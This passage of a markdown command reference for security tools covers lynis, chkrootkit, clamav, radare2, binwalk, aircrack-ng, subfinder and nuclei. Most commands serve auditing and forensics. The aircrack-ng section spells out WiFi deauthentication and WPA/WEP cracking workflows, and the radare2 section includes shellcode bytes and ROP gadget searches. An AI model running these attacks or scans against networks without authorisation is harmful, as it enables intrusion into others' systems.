# databases, file_integrity, file_permissions, filesystems, firewalls,
# hardening, kernel, logging, mac_frameworks, malware, memory,
# nameservices, networking, php, ports, printers, processes,
# scheduling, shells, squid, ssh, storage, time, tooling, webservers

# Specific test categories
sudo lynis audit system --tests "SSH-7408,SSH-7440"  # Specific tests
sudo lynis audit system --test-category security    # Security tests only

# Output options
sudo lynis audit system --report-file /tmp/lynis-report.txt
sudo lynis audit system --log-file /tmp/lynis.log
sudo lynis audit system --no-colors                 # No color output
sudo lynis audit system --quiet                     # Minimal output
sudo lynis audit system --verbose                   # Detailed output

# Compliance modes
sudo lynis audit system --compliance pci-dss        # PCI-DSS compliance
sudo lynis audit system --compliance hipaa          # HIPAA compliance
sudo lynis audit system --compliance iso27001       # ISO 27001

# Plugin usage
sudo lynis audit system --plugin-dir /path/to/plugins
sudo lynis audit system --plugins                   # List plugins

# Report and data
lynis show report                                   # View last report
lynis show details SSH-7408                         # Test details
lynis show groups                                   # Show test groups
lynis show options                                  # Show all options
lynis show version                                  # Version info
lynis show commands                                 # Available commands

# Update
sudo lynis update info                              # Check for updates
sudo lynis update release                           # Update to latest

# Profile customization
sudo lynis audit system --profile /path/to/custom.prf  # Custom profile

# Practical examples
# Full system audit with report
sudo lynis audit system --report-file /var/log/lynis-$(date +%Y%m%d).txt

# Quick security check
sudo lynis audit system --quick --quiet

# Compliance check
sudo lynis audit system --compliance pci-dss --report-file pci-audit.txt

# Check specific components
sudo lynis audit system --tests-from-group ssh,authentication,firewalls

# Automated scanning (cron job)
sudo lynis audit system --cronjob --report-file /var/log/lynis/report.txt

# View hardening index
sudo lynis audit system | grep "Hardening index"

# Check for malware
sudo lynis audit system --tests-from-group malware

# Container security audit
sudo lynis audit dockerfile /path/to/Dockerfile

# Suggestions and warnings
sudo lynis show details | grep -i "suggestion\|warning"

# Generate report for review
sudo lynis audit system --verbose --log-file audit.log --report-file report.txt

# Pentest mode (shows all findings)
sudo lynis audit system --pentest

# View categories
lynis show categories

# Custom severity levels
sudo lynis audit system --dump-options

# Integration examples
# Run and parse results
sudo lynis audit system --cronjob | grep "Warning\|Suggestion"

# JSON output (if supported)
sudo lynis audit system --format json

# Email report (with additional scripting)
sudo lynis audit system --cronjob --report-file /tmp/report.txt && mail -s "Lynis Report" admin@example.com < /tmp/report.txt
```

---


### **chkrootkit** - Rootkit Detector**Difficulty**: ⭐⭐⭐⭐ Advanced

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐ Advanced
aliases: []
tags: [#security, #rootkit, #malware-detection, #forensics, #system-integrity]
related: [lynis, rkhunter, clamav, aide]
keywords: [chkrootkit, rootkit detection, malware scanner, system compromise, trojan detection]
synonyms: [rootkit-hunter, rootkit-checker]
platform: [macOS, Linux]
installation: brew install chkrootkit
-->
**Description**: Tool to locally check for signs of rootkit infections on Unix-based systems
**Location**: `/opt/homebrew/bin/chkrootkit`
**Common Use Cases**:

- Rootkit detection
- System compromise investigation
- Security auditing
- Forensic analysis
- Malware detection
- System integrity checking

**Why Essential**: Specialized tool for detecting rootkits and common trojans that may evade standard antivirus.

**See Also**: `lynis` (security audit), `rkhunter` (rootkit hunter), `clamav` (antivirus)

**Examples**:

```bash
# Basic scan
sudo chkrootkit                                 # Full system scan
sudo chkrootkit -q                              # Quiet mode (only show infected)
sudo chkrootkit -n                              # Skip NFS mounted directories

# Specific tests
sudo chkrootkit ifpromisc                       # Check promiscuous interfaces
sudo chkrootkit chkwtmp                         # Check wtmp file
sudo chkrootkit chklastlog                      # Check lastlog file
sudo chkrootkit chkutmp                         # Check utmp file
sudo chkrootkit chkproc                         # Check processes
sudo chkrootkit chkdirs                         # Check directories
sudo chkrootkit strings                         # Check for strings exploit

# All available tests:
# ifpromisc, chkwtmp, chklastlog, chkutmp, chkproc, chkdirs,
# strings, bindshell, lkm, rexedcs, sniffer, w55808, wted,
# scalper, slapper, z2, chkutmp, t0rn, t rk, rh

# Output redirection
sudo chkrootkit > /var/log/chkrootkit.log       # Save to file
sudo chkrootkit 2>&1 | tee chkrootkit-$(date +%Y%m%d).log

# Exclude directories
sudo chkrootkit -x /mnt -x /media               # Exclude mount points

# Debug mode
sudo chkrootkit -d                              # Debug mode
sudo chkrootkit -d -x                           # Expert mode

# Specific rootkit checks
sudo chkrootkit -l                              # List all tests
sudo chkrootkit | grep INFECTED                 # Show only infections

# Practical examples
# Daily automated check
sudo chkrootkit -q > /var/log/chkrootkit/daily-$(date +%Y%m%d).log

# Quick infection check
sudo chkrootkit -q | grep -v "not found" | grep -v "not infected"

# Full scan with timestamp
echo "Scan started: $(date)" | sudo tee /var/log/chkrootkit-scan.log
sudo chkrootkit | sudo tee -a /var/log/chkrootkit-scan.log
echo "Scan completed: $(date)" | sudo tee -a /var/log/chkrootkit-scan.log

# Check for specific rootkits
sudo chkrootkit t0rn                            # Check for t0rn rootkit
sudo chkrootkit lkm                             # Check loadable kernel modules

# Network checks
sudo chkrootkit ifpromisc                       # Check for promiscuous mode
sudo chkrootkit sniffer                         # Check for sniffers

# Process checks
sudo chkrootkit chkproc                         # Hidden processes check

# Cron job example (add to /etc/cron.daily/chkrootkit)
# #!/bin/bash
# /usr/local/bin/chkrootkit -q | grep -v "not found" | grep -v "nothing found" | grep -v "not infected" > /var/log/chkrootkit-daily.log

# Email results if infections found
sudo chkrootkit -q | grep INFECTED && echo "ALERT: Rootkit detected!" | mail -s "Security Alert" admin@example.com

# Compare with previous scan
sudo chkrootkit > /tmp/current-scan.txt
diff /var/log/last-scan.txt /tmp/current-scan.txt

# Integration with other tools
# Run lynis and chkrootkit together
sudo lynis audit system --tests-from-group malware && sudo chkrootkit
```

---


### **clamav** - Antivirus Engine**Difficulty**: ⭐⭐⭐ Intermediate

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐ Intermediate
aliases: [clamscan, freshclam]
tags: [#security, #antivirus, #malware-detection, #virus-scanner, #email-security]
related: [lynis, chkrootkit, rkhunter]
keywords: [clamav, antivirus, virus scanner, malware detection, email scanning, file scanning]
synonyms: [virus-scanner, malware-scanner, av-engine]
platform: [macOS, Linux, Windows]
installation: brew install clamav
-->
**Description**: Open-source antivirus engine for detecting trojans, viruses, malware, and other malicious threats
**Location**: `/opt/homebrew/bin/clamscan`
**Common Use Cases**:

- File and directory scanning
- Email gateway scanning
- Web server protection
- Malware detection
- Virus removal
- Quarantine management

**Why Essential**: Most popular open-source antivirus engine, widely used for mail server and file scanning.

**See Also**: `lynis` (security audit), `chkrootkit` (rootkit detection), `freshclam` (update tool)

**Examples**:

```bash
# First-time setup
freshclam                                       # Update virus definitions

# Basic scanning
clamscan file.txt                               # Scan single file
clamscan directory/                             # Scan directory
clamscan -r /home/user                          # Recursive scan
clamscan -r --bell /path                        # Alert with bell on detection

# Scan entire system
sudo clamscan -r /                              # Scan root filesystem
sudo clamscan -r / --exclude-dir=/sys --exclude-dir=/proc --exclude-dir=/dev

# Remove infected files
clamscan -r --remove /path                      # Delete infected files
clamscan -r --move=/quarantine /path            # Move to quarantine
clamscan -r --copy=/backup /path                # Copy infected to folder

# Output and logging
clamscan -r /path -l scan.log                   # Log to file
clamscan -r /path -l scan.log --log-verbose     # Verbose logging
clamscan -r /path --file-list=files.txt         # Scan files from list

# Performance
clamscan -r /path --max-filesize=100M           # Max file size
clamscan -r /path --max-scansize=500M           # Max scan size
clamscan -r /path --max-recursion=10            # Recursion limit
clamscan -r /path -j 4                          # Use 4 CPU cores

# Scan archives
clamscan -r /path --scan-archive=yes            # Scan archives
clamscan -r /path --scan-pdf=yes                # Scan PDFs
clamscan -r /path --scan-ole2=yes               # Scan MS Office
clamscan -r /path --scan-mail=yes               # Scan emails

# Detection options
clamscan -r /path --detect-pua=yes              # Potentially unwanted apps
clamscan -r /path --detect-broken=yes           # Detect broken executables
clamscan -r /path --algorithmic-detection=yes   # Enhanced detection

# Specific file types
clamscan -r /path --scan-elf=yes                # Scan ELF files
clamscan -r /path --scan-pe=yes                 # Scan PE files
clamscan -r /path --scan-html=yes               # Scan HTML

# Database information
clamconf                                        # Show configuration
clamdscan --version                             # Version info
sigtool --info /var/lib/clamav/main.cvd         # Database info

# Update virus definitions
freshclam                                       # Update databases
freshclam --quiet                               # Quiet update
freshclam --datadir=/custom/path                # Custom database location

# Daemon mode (clamd)
clamd                                           # Start daemon
clamdscan /path                                 # Scan using daemon (faster)
clamdscan -m /path                              # Multiscan mode
clamdscan -c /path                              # Continue scanning

# Practical examples
# Daily scan of home directory
clamscan -r --move=/quarantine /home/user -l /var/log/clamav/scan-$(date +%Y%m%d).log

# Scan and remove infected files
clamscan -r --infected --remove /var/www/html

# Quick scan with alerts
clamscan -r --bell --infected /tmp

# Comprehensive system scan
sudo clamscan -r --exclude-dir=/sys --exclude-dir=/proc --exclude-dir=/dev / -l /var/log/clamav/full-scan.log

# Scan mail directory
clamscan -r --scan-mail=yes ~/Mail -l mail-scan.log

# Scan downloads folder
clamscan -r ~/Downloads --move=/quarantine --log=/var/log/clamav/downloads.log

# Memory scan
clamscan -r --detect-pua=yes --algorithmic-detection=yes /proc

# Web server scan
sudo clamscan -r --infected --move=/quarantine /var/www -l /var/log/clamav/webserver.log

# Automated scanning script
#!/bin/bash
freshclam --quiet
clamscan -r --infected --remove /home -l /var/log/clamav/daily-$(date +%Y%m%d).log
if [ $? -eq 1 ]; then
    echo "Viruses found!" | mail -s "ClamAV Alert" admin@example.com
fi

# Scan specific extensions
find /path -name "*.exe" -o -name "*.dll" | xargs clamscan

# Monitor directory for changes and scan
# Use with inotify
while inotifywait -r -e create /watched/directory; do
    clamscan -r /watched/directory --infected --remove
done

# Database update check
sigtool --info /opt/homebrew/var/lib/clamav/main.cvd

# Test with EICAR test file
curl https://secure.eicar.org/eicar.com.txt | clamscan -
# Should detect: Eicar-Test-Signature
```

---


## Reverse Engineering & Forensics

### **radare2** - Reverse Engineering Framework**Difficulty**: ⭐⭐⭐⭐⭐ Expert

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐⭐ Expert
aliases: [r2, rabin2, radiff2, rafind2, ragg2, rahash2, rasm2, rax2]
tags: [#security, #reverse-engineering, #binary-analysis, #disassembler, #debugger, #forensics]
related: [binwalk, ghidra, gdb, objdump, strings]
keywords: [radare2, reverse engineering, binary analysis, disassembler, debugger, malware analysis, exploitation]
synonyms: [r2, binary-analyzer, disassembler]
platform: [macOS, Linux, Windows]
installation: brew install radare2
-->
**Description**: Advanced command-line reverse engineering framework with disassembler, debugger, and binary analysis tools
**Location**: `/opt/homebrew/bin/radare2`
**Common Use Cases**:

- Binary analysis and reverse engineering
- Malware analysis
- Vulnerability research
- Exploit development
- Firmware analysis
- Forensics

**Why Essential**: Complete reverse engineering framework with powerful analysis capabilities for security research.

**See Also**: `binwalk` (firmware analysis), `ghidra` (GUI alternative), `gdb` (debugger), `objdump` (binary inspection)

**Examples**:

```bash
# Basic usage
r2 binary                                       # Open binary
r2 -A binary                                    # Auto-analyze at startup
r2 -d binary                                    # Debug mode
r2 -w binary                                    # Write mode

# Analysis
rabin2 -I binary                                # Binary info
rabin2 -i binary                                # Imports
rabin2 -e binary                                # Entrypoint
rabin2 -s binary                                # Symbols
rabin2 -z binary                                # Strings in data section
rabin2 -zz binary                               # All strings

# File information
rabin2 -I malware.exe                           # Show file info
rabin2 -H malware.exe                           # Headers
rabin2 -l malware.exe                           # Libraries
rabin2 -R malware.exe                           # Relocations

# Inside radare2 session
# Commands (use 'q' to quit)
aaa                                             # Analyze all
afl                                             # List functions
pdf @ main                                      # Disassemble main function
s main                                          # Seek to main
VV                                              # Visual graph mode
V                                               # Visual mode

# Search
/                                               # Search in radare2 prompt
/ password                                      # Search for "password" string
/x 4889e5                                       # Search for hex bytes
/R pop rdi                                      # Search for ROP gadgets

# Strings
iz                                              # Strings in data sections
izz                                             # All strings
izzz                                            # All strings (including code)

# Cross-references
axt @ sym.main                                  # Find xrefs to main
axf @ sym.main                                  # Find xrefs from main

# Hex manipulation
rax2 1337                                       # Decimal to hex
rax2 0x539                                      # Hex to decimal
rax2 -s "Hello"                                 # String to hex
rax2 -S 48656c6c6f                              # Hex to string

# Hashing
rahash2 file.bin                                # All hashes
rahash2 -a md5 file.bin                         # MD5 hash
rahash2 -a sha256 file.bin                      # SHA256
rahash2 -s "password"                           # Hash string

# Assembly/Disassembly
rasm2 "mov eax, 33"                             # Assemble instruction
rasm2 -d "b821000000"                           # Disassemble hex

# Diffing
radiff2 binary1 binary2                         # Binary diff
radiff2 -g main binary1 binary2                 # Graph diff

# Exploitation
ragg2 -P 100 -r                                 # Generate 100-byte pattern
ragg2 -i shellcode.c                            # Compile shellcode
ragg2 -P 100 -q 0x41424344                      # Find offset in pattern

# Debugging
r2 -d /bin/ls                                   # Debug ls
db main                                         # Breakpoint at main
dc                                              # Continue
ds                                              # Step
dr                                              # Show registers

# Project management
Ps project_name                                 # Save project
Po project_name                                 # Open project
Pd project_name                                 # Delete project

# Practical examples
# Analyze malware
r2 -A malware.exe
aaa                                             # Deep analysis
afl                                             # List functions
pdf @ main                                      # Disassemble main

# Find interesting strings
rabin2 -zz suspicious.bin | grep -i "password\|key\|secret"

# Extract embedded files
r2 firmware.bin
/x ffd8ffe0                                     # Search for JPEG signature
s hit0_0                                        # Seek to hit
wtf image.jpg 50000                             # Write to file

# Crack simple binary
r2 -d crackme
aaa
pdf @ main
db 0x08048567                                   # Set breakpoint
dc                                              # Continue
dr eax=1                                        # Modify register

# Shellcode analysis
rasm2 -d "31c050682f2f7368682f62696e89e3505389e131d2b00bcd80"

# Find ROP gadgets
r2 -A binary
"/R pop rdi; ret"
"/R pop rsi; ret"

# Binary patching
r2 -w binary
s 0x08048567                                    # Seek to address
wa nop                                          # Write assembly
wa jmp 0x08048600

# Firmware analysis
rabin2 -I firmware.bin
rabin2 -zz firmware.bin | grep "admin\|password"

# Compare binaries
radiff2 -C binary_v1 binary_v2

# Extract executable sections
rabin2 -S binary.elf
r2 -qc "s section..text; pxr" binary.elf > text_section.hex

# Advanced analysis script
r2 -A -qc "aaa; afl; pdf @ main; q" binary > analysis.txt

# Kernel module analysis
r2 -A kernel_module.ko
aaa
afl
pdf @ sym.init_module
```

---


### **binwalk** - Firmware Analysis Tool**Difficulty**: ⭐⭐⭐⭐ Advanced

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐ Advanced
aliases: []
tags: [#security, #firmware, #forensics, #reverse-engineering, #embedded, #file-analysis]
related: [radare2, strings, file, dd]
keywords: [binwalk, firmware analysis, embedded systems, file carving, signature analysis, entropy analysis]
synonyms: [firmware-analyzer, file-carver]
platform: [macOS, Linux]
installation: brew install binwalk
-->
**Description**: Firmware analysis tool for searching binary images for embedded files and executable code
**Location**: `/opt/homebrew/bin/binwalk`
**Common Use Cases**:

- Firmware analysis
- File extraction from binaries
- Embedded system research
- IoT device analysis
- Forensic investigations
- Malware analysis

**Why Essential**: De facto standard for analyzing and extracting firmware images and embedded files.

**See Also**: `radare2` (binary analysis), `strings` (string extraction), `file` (file type detection)

**Examples**:

```bash
# Basic analysis
binwalk firmware.bin                            # Scan for signatures
binwalk -B firmware.bin                         # Scan signatures (verbose)
binwalk -A firmware.bin                         # Scan for architectures
binwalk -E firmware.bin                         # Entropy analysis

# Extraction
binwalk -e firmware.bin                         # Extract files
binwalk -e --dd='.*' firmware.bin               # Extract all signatures
binwalk -Me firmware.bin                        # Matryoshka (recursive) extraction
binwalk -e --preserve-symlinks firmware.bin     # Keep symlinks

# Signature scanning
binwalk -y filesystem firmware.bin              # Only filesystem signatures
binwalk -y compressed firmware.bin              # Only compressed files
binwalk -y archive firmware.bin                 # Only archives
binwalk -y crypto firmware.bin                  # Crypto signatures

# Filter by signature
binwalk --include=filesystem firmware.bin       # Include filesystems
binwalk --exclude=jpeg firmware.bin             # Exclude JPEG files
binwalk --exclude=png --exclude=gif firmware.bin

# Entropy analysis
binwalk -E -J firmware.bin                      # Entropy graph (JPG)
binwalk -E -F firmware.bin                      # Entropy scan with markers
binwalk -E -H firmware.bin                      # Entropy + histogram

# String extraction
binwalk -R firmware.bin                         # Raw string search
binwalk -R '\x00\x00\x00\x00' firmware.bin      # Search for null bytes

# Custom signatures
binwalk -m magic.binwalk firmware.bin           # Custom magic file
binwalk --term firmware.bin                     # Display to terminal

# Hex dump
binwalk -W firmware.bin                         # Hexdump matching signatures

# Disassembly
binwalk -D='.*' firmware.bin                    # Disassemble everything
binwalk -D='filesystem:ext' firmware.bin        # Disassemble ext filesystem

# Output options
binwalk -f results.txt firmware.bin             # Log to file
binwalk -q firmware.bin                         # Quiet mode
binwalk -v firmware.bin                         # Verbose mode

# Raw extraction
binwalk -e --dd='squashfs:squashfs' firmware.bin  # Extract squashfs
binwalk -e --dd='gzip:gz' firmware.bin          # Extract gzip

# Practical examples
# Analyze router firmware
binwalk firmware.bin
binwalk -E firmware.bin                         # Check entropy (encryption?)
binwalk -Me firmware.bin                        # Extract everything

# Find filesystem
binwalk -y filesystem router.bin
binwalk -e --dd='squashfs:squashfs' router.bin

# Extract compressed data
binwalk firmware.bin | grep -i "gzip\|zlib\|lzma"
binwalk -e --dd='gzip:gz' firmware.bin

# Search for specific files
binwalk -y jpeg camera_firmware.bin
binwalk -y certificate security_module.bin

# Analyze encrypted firmware
binwalk -E encrypted.bin                        # High entropy = encrypted
binwalk -A encrypted.bin                        # Check architecture

# Extract and analyze
binwalk -Me firmware.bin
cd _firmware.bin.extracted
ls -lah
file *
strings -n 10 * | grep -i "password\|admin\|root"

# Find embedded Linux kernel
binwalk -y linux firmware.bin
binwalk -e --dd='linux:vmlinux' firmware.bin

# Search for specific hex pattern
binwalk -R '\x7fELF' firmware.bin               # Find ELF headers

# Compare firmwares
binwalk firmware_v1.bin > v1.txt
binwalk firmware_v2.bin > v2.txt
diff v1.txt v2.txt

# Extract at specific offset
dd if=firmware.bin of=extracted.bin bs=1 skip=123456 count=789012
binwalk -e extracted.bin

# Scan multiple files
binwalk *.bin

# Entropy + extraction pipeline
binwalk -E firmware.bin                         # Analyze entropy
binwalk -Me firmware.bin                        # Extract if not encrypted
cd _firmware.bin.extracted
find . -type f -exec file {} \;

# Find bootloader
binwalk -y bootloader firmware.bin

# Extract all filesystems
binwalk -e --dd='filesystem:*' firmware.bin

# Search for certificates
binwalk -y certificate firmware.bin

# Advanced signature search
binwalk --term --include=filesystem --include=compressed firmware.bin

# Recursive deep scan
binwalk -Me --depth 10 firmware.bin             # Max depth 10

# Custom extraction with dd
binwalk firmware.bin
# Note offset from output
dd if=firmware.bin of=part1.bin bs=1 skip=OFFSET count=SIZE
```

---


## Advanced Reconnaissance & Specialized Tools

### **aircrack-ng** - WiFi Security Auditing**Difficulty**: ⭐⭐⭐⭐⭐ Expert

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐⭐ Expert
aliases: [airodump-ng, aireplay-ng, airmon-ng, airdecap-ng]
tags: [#security, #wifi, #wireless, #penetration-testing, #packet-capture, #wep, #wpa]
related: [wireshark, tcpdump, nmap]
keywords: [aircrack-ng, wifi hacking, wireless security, wpa cracking, wep cracking, packet injection, monitor mode]
synonyms: [wifi-cracker, wireless-auditor]
platform: [macOS, Linux]
installation: brew install aircrack-ng
-->
**Description**: Complete suite of tools to assess WiFi network security - cracking WEP and WPA/WPA2-PSK keys
**Location**: `/opt/homebrew/bin/aircrack-ng`
**Common Use Cases**:

- WiFi security auditing
- Wireless penetration testing
- WEP/WPA cracking
- Packet capture and analysis
- Network monitoring
- Access point testing

**Why Essential**: Industry-standard wireless security auditing suite with comprehensive WiFi testing capabilities.

**See Also**: `wireshark` (packet analysis), `tcpdump` (packet capture), `nmap` (network scanning)

**Examples**:

```bash
# Monitor mode
sudo airmon-ng start en0                        # Enable monitor mode
sudo airmon-ng stop en0mon                      # Disable monitor mode
sudo airmon-ng check kill                       # Kill interfering processes

# Packet capture
sudo airodump-ng en0mon                         # Scan all networks
sudo airodump-ng --band abg en0mon              # Scan all bands (a/b/g)
sudo airodump-ng -c 6 en0mon                    # Specific channel
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture en0mon  # Target AP

# Capture options
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture en0mon
# Options:
# -c: channel
# --bssid: target BSSID
# -w: write to file (creates .cap file)
# --output-format: pcap, ivs, csv, gps, kismet, netxml

# WPA handshake capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake en0mon
# Wait for handshake or deauth client to force reconnect

# Deauthentication attack (to capture handshake)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF en0mon  # Deauth all clients
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC en0mon  # Specific client

# WPA cracking
aircrack-ng -w wordlist.txt capture-01.cap      # Dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# WEP cracking
aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap  # Auto-detect encryption
aircrack-ng -n 128 capture-01.cap               # 128-bit WEP
aircrack-ng -n 64 capture-01.cap                # 64-bit WEP

# Packet injection test
sudo aireplay-ng --test en0mon                  # Test injection
sudo aireplay-ng --test wlan1 -i wlan0          # Test with specific interface

# Fake authentication (WEP)
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h YOUR_MAC en0mon
sudo aireplay-ng --fakeauth 6000 -o 1 -q 10 -a AA:BB:CC:DD:EE:FF en0mon

# ARP replay (WEP)
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h YOUR_MAC en0mon

# Chopchop attack (WEP)
sudo aireplay-ng --chopchop -b AA:BB:CC:DD:EE:FF -h YOUR_MAC en0mon

# Fragment attack (WEP)
sudo aireplay-ng --fragment -b AA:BB:CC:DD:EE:FF -h YOUR_MAC en0mon

# Decrypt captured packets
airdecap-ng -w WEP_KEY -b AA:BB:CC:DD:EE:FF capture-01.cap  # WEP
airdecap-ng -p WPA_PASSWORD -e SSID capture-01.cap          # WPA

# Convert formats
airolib-ng database --import passwd wordlist.txt  # Create database
airolib-ng database --import essid essid.txt
airolib-ng database --batch                       # Generate PMKs
aircrack-ng -r database capture-01.cap            # Crack with database

# Tools in suite
airmon-ng                                       # Monitor mode management
airodump-ng                                     # Packet capture
aireplay-ng                                     # Packet injection
aircrack-ng                                     # Cracking
airdecap-ng                                     # Decryption
airolib-ng                                      # PMK database
packetforge-ng                                  # Packet forging
ivstools                                        # IV tools
makeivs-ng                                      # Generate IV files

# Practical examples
# Complete WPA capture and crack
sudo airmon-ng start en0
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa en0mon
# In another terminal:
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF en0mon
# Wait for handshake, then Ctrl+C
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa-01.cap

# WEP cracking workflow
sudo airmon-ng start en0
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep en0mon
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h YOUR_MAC en0mon
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h YOUR_MAC en0mon
# Wait for enough IVs (40,000+)
aircrack-ng wep-01.cap

# Survey networks
sudo airmon-ng start en0
sudo airodump-ng en0mon --output-format csv -w survey
# Ctrl+C after scan
cat survey-01.csv

# Target specific network
sudo airodump-ng -c CHANNEL --bssid BSSID -w output en0mon

# Handshake verification
aircrack-ng capture-01.cap
# Look for "1 handshake" in output

# Clean up
sudo airmon-ng stop en0mon
sudo service network-manager restart  # Restart networking
```

---


### **subfinder** - Subdomain Discovery**Difficulty**: ⭐⭐⭐ Intermediate

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐ Intermediate
aliases: []
tags: [#security, #reconnaissance, #subdomain-enumeration, #osint, #bug-bounty]
related: [amass, gobuster, assetfinder, nmap]
keywords: [subfinder, subdomain enumeration, passive reconnaissance, domain discovery, bug bounty, osint]
synonyms: [subdomain-finder, domain-enumerator]
platform: [macOS, Linux, Windows]
installation: brew install subfinder
-->
**Description**: Fast subdomain discovery tool using passive online sources - designed for bug bounty hunters
**Location**: `/opt/homebrew/bin/subfinder`
**Common Use Cases**:

- Subdomain enumeration
- Passive reconnaissance
- Bug bounty hunting
- Attack surface mapping
- Asset discovery
- Security assessments

**Why Essential**: Fast, comprehensive subdomain discovery using 30+ passive sources without active scanning.

**See Also**: `amass` (comprehensive OSINT), `assetfinder` (subdomain finder), `gobuster` (DNS brute force)

**Examples**:

```bash
# Basic usage
subfinder -d example.com                        # Find subdomains
subfinder -d example.com -o results.txt         # Save to file
subfinder -d example.com -silent                # Silent mode (only results)

# Multiple domains
subfinder -dL domains.txt                       # From file
subfinder -d example.com,test.com               # Comma-separated

# Output options
subfinder -d example.com -o output.txt          # Save results
subfinder -d example.com -oJ                    # JSON output
subfinder -d example.com -oD results/           # Output directory
subfinder -d example.com -silent -o clean.txt   # Clean output

# Sources
subfinder -d example.com -ls                    # List sources
subfinder -d example.com -sources               # Show sources used
subfinder -d example.com -exclude-sources source1,source2
subfinder -d example.com -all                   # Use all sources

# Filtering
subfinder -d example.com -nW                    # Remove wildcards
subfinder -d example.com -r 8.8.8.8,1.1.1.1     # Custom resolvers
subfinder -d example.com -rL resolvers.txt      # Resolver list

# Rate limiting
subfinder -d example.com -t 10                  # 10 concurrent requests
subfinder -d example.com -timeout 30            # 30 second timeout
subfinder -d example.com -max-time 10           # Max 10 minutes

# Verification
subfinder -d example.com -v                     # Verbose
subfinder -d example.com -nC                    # No color output
subfinder -d example.com -recursive             # Recursive enumeration

# API configuration
subfinder -d example.com -config config.yaml    # Custom config
# Config includes API keys for:
# - Censys, Shodan, VirusTotal, SecurityTrails, etc.

# Practical examples
# Quick scan
subfinder -d target.com -silent > subdomains.txt

# Comprehensive scan with verification
subfinder -d target.com -all -v -o all_subdomains.txt

# Multiple domains from file
subfinder -dL targets.txt -o results.txt

# Recursive discovery
subfinder -d example.com -recursive -o recursive.txt

# Integration with other tools
# Find subdomains and resolve
subfinder -d example.com -silent | dnsx -silent -a -resp

# Find subdomains and probe for HTTP
subfinder -d example.com -silent | httpx -silent -title -tech-detect

# Find subdomains and port scan
subfinder -d example.com -silent | nmap -iL - -p- -oA scan

# Find subdomains and screenshot
subfinder -d example.com -silent | aquatone

# Bug bounty workflow
subfinder -d target.com -all -recursive -o subs.txt
cat subs.txt | httpx -silent -status-code -title > active.txt
cat active.txt | nuclei -t ~/nuclei-templates/

# Compare with previous scan
subfinder -d example.com -silent | sort > current.txt
diff previous.txt current.txt

# Filter by pattern
subfinder -d example.com -silent | grep "api\|admin\|dev\|staging"

# Multiple domain enumeration
echo "domain1.com domain2.com domain3.com" | tr ' ' '\n' > domains.txt
subfinder -dL domains.txt -o all_subs.txt
```

---


### **nuclei** - Vulnerability Scanner**Difficulty**: ⭐⭐⭐⭐ Advanced

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐ Advanced
aliases: []
tags: [#security, #vulnerability-scanner, #automation, #bug-bounty, #templates, #cve]
related: [nmap, nikto, sqlmap, subfinder]
keywords: [nuclei, vulnerability scanner, template-based scanning, cve detection, bug bounty, security automation]
synonyms: [vuln-scanner, template-scanner]
platform: [macOS, Linux, Windows]
installation: brew install nuclei
-->
**Description**: Fast, template-based vulnerability scanner with 5000+ community templates
**Location**: `/opt/homebrew/bin/nuclei`
**Common Use Cases**:

- Vulnerability scanning
- CVE detection
- Misconfiguration finding
- Security automation
- Bug bounty hunting
- Continuous security testing

**Why Essential**: Modern, fast vulnerability scanner with extensive template library and active community.

**See Also**: `nmap` (network scanner), `nikto` (web scanner), `sqlmap` (SQL injection)

**Examples**:

```bash
# First, update templates
nuclei -update-templates                        # Update template database

# Basic scanning
nuclei -u https://example.com                   # Single URL
nuclei -l urls.txt                              # Multiple URLs from file
nuclei -u https://example.com -t ~/nuclei-templates/  # Specific templates

# Template categories
nuclei -u https://example.com -t cves/          # Only CVEs
nuclei -u https://example.com -t vulnerabilities/
nuclei -u https://example.com -t exposed-panels/
nuclei -u https://example.com -t exposures/
nuclei -u https://example.com -t misconfigurations/
nuclei -u https://example.com -t technologies/

# Severity filtering
nuclei -l urls.txt -severity critical           # Critical only
nuclei -l urls.txt -severity high,critical      # High and critical
nuclei -l urls.txt -severity medium,high,critical
nuclei -l urls.txt -severity low,medium,high,critical,info

# Template selection
nuclei -l urls.txt -t cves/2024/               # 2024 CVEs only
nuclei -l urls.txt -t cves/ -tags apache        # Apache CVEs
nuclei -l urls.txt -t vulnerabilities/wordpress/  # WordPress vulns
nuclei -l urls.txt -tags xss,sqli               # Specific tags

# Exclude templates
nuclei -l urls.txt -etags dos                   # Exclude DoS templates
nuclei -l urls.txt -exclude-templates dos/      # Exclude directory

# Output
nuclei -l urls.txt -o results.txt               # Save results
nuclei -l urls.txt -json -o results.json        # JSON output
nuclei -l urls.txt -markdown -o report.md       # Markdown report
nuclei -l urls.txt -me results/                 # Markdown export directory

# Rate limiting
nuclei -l urls.txt -rate-limit 100              # 100 requests/second
nuclei -l urls.txt -c 25                        # 25 concurrent requests
nuclei -l urls.txt -timeout 5                   # 5 second timeout
nuclei -l urls.txt -retries 3                   # 3 retries on failure

# Advanced options
nuclei -l urls.txt -v                           # Verbose
nuclei -l urls.txt -debug                       # Debug mode
nuclei -l urls.txt -silent                      # Silent mode
nuclei -l urls.txt -stats                       # Show statistics
nuclei -l urls.txt -metrics                     # Show metrics

# Proxy
